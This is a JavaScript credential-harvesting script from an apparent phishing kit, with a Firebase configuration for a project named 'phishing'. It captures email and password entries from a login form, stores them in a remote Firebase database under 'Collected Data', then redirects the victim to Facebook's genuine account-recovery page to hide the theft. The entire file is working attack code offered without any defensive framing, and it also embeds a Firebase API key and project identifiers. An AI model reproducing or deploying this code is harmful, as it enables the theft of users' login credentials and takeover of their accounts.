var firebaseConfig = {
  apiKey: "AIzaSyBfnlA58450TFyoQDQkl2N-OVnvEh8Y6jA",
  authDomain: "phishing-a9590.firebaseapp.com",
  databaseURL: "https://phishing-a9590-default-rtdb.firebaseio.com",
  projectId: "phishing-a9590",
  storageBucket: "phishing-a9590.appspot.com",
  messagingSenderId: "121639016861",
  appId: "1:121639016861:web:8abf111817e003b4877774",
  measurementId: "G-M13XMG1EL3"
};

firebase.initializeApp(firebaseConfig);
document.getElementById('contactForm')
.addEventListener('submit', submitForm);

var MessageRef = firebase.database().ref('Collected Data');

function submitForm(e) {

    e.preventDefault();

    // Get values
    var email = getInputVal('email');
    var password = getInputVal('password');

    saveMessage(email, password);
    document.getElementById('contactForm').reset();
    setTimeout(function() {
        location = 'https://www.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&_rdr'
    }, 100)
}

// Function to get get form values
function getInputVal(id) {
    return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(email, password) {
    var newMessageRef = MessageRef.push();
    newMessageRef.set({
        email: email,
        password: password,
    });
}